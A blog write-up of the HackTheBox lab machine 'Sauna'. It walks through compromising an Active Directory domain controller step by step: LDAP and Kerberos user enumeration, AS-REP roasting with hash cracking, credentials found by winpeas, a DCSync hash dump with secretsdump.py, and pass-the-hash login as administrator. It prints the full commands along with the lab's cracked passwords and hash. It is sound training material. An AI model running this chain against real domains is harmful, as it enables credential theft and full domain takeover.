---
title: "HackTheBox - Sauna"
layout: post
date: 2020-07-18 23:00:00 +0800
---

![538af09462c906cb0e66d9594a58a02d.png](/images/htb-sauna/bb9f1e9dd61740339b4baa92250e9815.png)

### 0. Preface

Nothing much to really write about here, but the DCSync attack was really interesting, and demonstrates how poorly configured AD permissions can spell disaster. 

In this box, we will be tackling:

1. Active Directory enumeration.
2. Using NMAP scripts to get valid users. 
3. ASREPRoasting.
4. dsacls and a DCSync attack.

<!--excerpt-->

---

### 1. Preliminary NMAP Scan
```bash
sudo nmap -sC -sV -O -oN nmap.txt 10.10.10.175 -p- -v
```

![77135401280f1fb127a3de512d378651.png](/images/htb-sauna/1403eb066607457e8ecf8bb30b2e5b6d.png)

This is a domain controller that is running on at least Windows Server 2016 (IIS 10.0), with the domain name of EGOTISTICAL-BANK.LOCAL. 

### 2. Anonymous LDAP Enumeration 

First, we are going to start off with LDAP enumeration using nmap to grab the AD Schema (RootDSE) as well as any anonymously available users. 

```bash
sudo nmap -p389 -oN nmap-rootdse.txt 10.10.10.175 -v --script ldap-rootdse
```
![5fefb856d54de0d569630853010de29d.png](/images/htb-sauna/e9c4c252a2774440a6cd7b6fbd11b80c.png)
![f8ea0bada759c9c07fa62c45df6d2dca.png](/images/htb-sauna/413534f761cf45d8a51d18a79266214b.png)

From here, we can see that the domain and forest functionality are 7, which makes it a Windows 2016 Domain Controller. Scrolling further down the results, we can also see that the FQDN of this domain controller is SAUNA.EGOTISTICAL-BANK.LOCAL.

```bash
sudo nmap -p389 -oN nmap-ldap.txt 10.10.10.175 -v --script ldap-search
```
![1d15cc07ee999db24b89c83dcccce447.png](/images/htb-sauna/fdf14f435fa04b3199fc7ccc2dcdacf5.png)

Using ldap-search, we are unable to see attributes anonymously, so let's move on. 

### 3. Web Server & Further Enumeration

Next, we are going to move on to the web server on port 80. 

![2cc08c79c88425cdb49fba35aaa1daa9.png](/images/htb-sauna/1647f42c695346a28322a09a2d92338b.png)

Trying to access some of the links at the top tells us that this is a website that's running on html. We will be running a gobuster scan to find out what .html files are available to us. 

```bash
gobuster dir -u http://10.10.10.175 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html
```

![ab9077496361a3e68f75cc133aac8d6d.png](/images/htb-sauna/a574c2bf17c0461fa48267254a920e91.png)

Nothing jumps out from the results of the scan, so we are going to have to go through the pages one by one. Looking at the about.html page, we see that there is a list of potential users we can make use of. 

![ae1def2e22163f64a3f668fefb287295.png](/images/htb-sauna/f58c613057fe40cdb4cd19b2cfe247d4.png)

Using this information, we can create a user list using some AD username conventions, then run it through nmap's krb5-enum-users script to check if the users exist. 

Here's the list of usernames we end up with: 

![296a1dbed5021c3c5ceccf00647cef8a.png](/images/htb-sauna/2cfbd3ab4a0a4ab3990a1af5a5d71046.png)

```bash
sudo nmap -p389 -oN nmap-krb5.txt 10.10.10.175 -v --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb='userlist.txt'
```

![f3e2dfd6af557d7c24686e7aa1755de5.png](/images/htb-sauna/f0d15e6672634da4881dc3620e593b12.png)

### 4. Exploiting Kerberos Pre-Authentication (ASREPROAST)

Next, we can try to see if fsmith has Kerberos Pre-Authentication disabled by running Impacket's `GetNPUsers.py`. If the user has Kerberos pre-authentication disabled, this script will return the password hash of the user which we can crack offline with JohnTheRipper. 

```bash
GetNPUsers.py 'egotistical-bank.local/fsmith' -no-pass -dc-ip 10.10.10.175 -format john
```

![cf840d809941ac02d083b62435e74ee4.png](/images/htb-sauna/4dcad8b4208a4202aeaf0b4fd5969d9c.png)

```bash
sudo john --wordlist:/usr/share/wordlists/rockyou.txt fsmith.hash
sudo john --show fsmith.hash
```

![e9a53e46aea1ff99e459c98f10e955a1.png](/images/htb-sauna/1fb7fcbb1aee4715a47f9aba62cf618b.png)

This nets us our first set of credentials, `egotistical-bank.local/fsmith:Thestrokes23`.

### 5. Authenticated LDAP Enumeration 

Using fsmith's credentials, we can use RPCClient to further enumerate the domain controller. 

```bash
rpcclient -U 'egotistical-bank.local/fsmith%Thestrokes23' 10.10.10.175
```

Using `enumdomusers`, we can get a list of domain users from the domain controller.

![3bcdd834496a33e7bc9ec49f99d15afe.png](/images/htb-sauna/e0ff7db9f31d4a07860379b16cd104c3.png)

Next, using `enumalsgroups domain` and `enumalsgroups builtin`, we can see the list of groups available on the domain controller. 

![b1ed8c86a08bac3e50417fd4f6ca8370.png](/images/htb-sauna/4d38fd4727264e66a742ac640f65858a.png)

We can take a look at the Remote Management Users group by using `queryaliasmem builtin 0x244` to see who is able to remotely access the domain controller. We get a list of SIDs from this. 

![b8abada25af0e57b8d84a769fc55e58a.png](/images/htb-sauna/a5bd3ada459549cca823c657b3322c2d.png)

We can lookup the SIDs and see who these belong to using `lookupsids <SID>`. We see that fsmith and svc_loanmgr are in that group. 

![693c5e6bdf8b94d10d190382d1edf9d1.png](/images/htb-sauna/4822af96256343fc977063a04d28f778.png)

### 6. Evil-WinRM and Further Enumeration

Since WinRM is open, we can use Evil-WinRM to remotely access the domain controller as fsmith. 

```bash 
evil-winrm -i 10.10.10.175 -u 'egotistical-bank.local\fsmith' -p 'Thestrokes23'
```

We can now grab the user flag from fsmith's desktop. 

![067f3c054d65f50b0551fee1562ceba9.png](/images/htb-sauna/74125d560848491e8fd9d06b2e24da33.png)

Next, we can start to enumerate the machine. One way to do so is to use winpeas.bat. This batch script will output anything potentially exploitable in the Windows machine. 

```bash
upload ~/haxx0r/windows/winpeas.bat
./winpeas.bat
```

In the winpeas.bat output, we can see that there is a registry key with the username egotistical-bank\svc_loanmanager and a password Moneymakestheworldgoround!

![4a505b878cc9ef0defa32da43787bcf7.png](/images/htb-sauna/d27f97a8df7b44468f1d2ca1d0b52372.png)

We potentially have our next set of credentials - `egotistical-bank.local\svc_loanmgr:Moneymakestheworldgoround!`

Once the script finishes, we can next try enumerating the Domain Controller permissions using `dsacls`. 

```cmd
dsacls "DC=EGOTISTICAL-BANK,DC=LOCAL"
```
![187e0877a55e1efe4bb1b26b3d0a1c04.png](/images/htb-sauna/b1b87f4c521e492dabd594199cc7a6ed.png)

From the output, we can see that svc_loanmgr has the 'Replicating Directory Changes (All)' permissions. This account can be used to do a DCSync attack to get the LMHashes and NTHashes of the administrator account. 

### 7. DCSync Attack and Privilege Escalation 

To do the DCSync attack, we will be using Impacket's `secretsdump.py`. For this to work properly, a hosts file entry has to be added for egotistical-bank.local. 

```bash
secretsdump.py svc_loanmgr@EGOTISTICAL-BANK.LOCAL
```

![5495e19626ee186d150caa8c9d169604.png](/images/htb-sauna/870ff2a14e424d239b89fe9e331f535f.png)

Now that we have dumped the hashes, we can make use of Evil-WinRM again to pass the administrator's NTHash and root the machine. 

```bash
evil-winrm -i 10.10.10.175 -u 'egotistical-bank.local\administrator' -H 'd9485863c1e9e05851aa40cbb4ab9dff'
```

![398933b0fd1a28f3e23a2664db9340bc.png](/images/htb-sauna/3da82e6a3eac4acd941694f802da6707.png)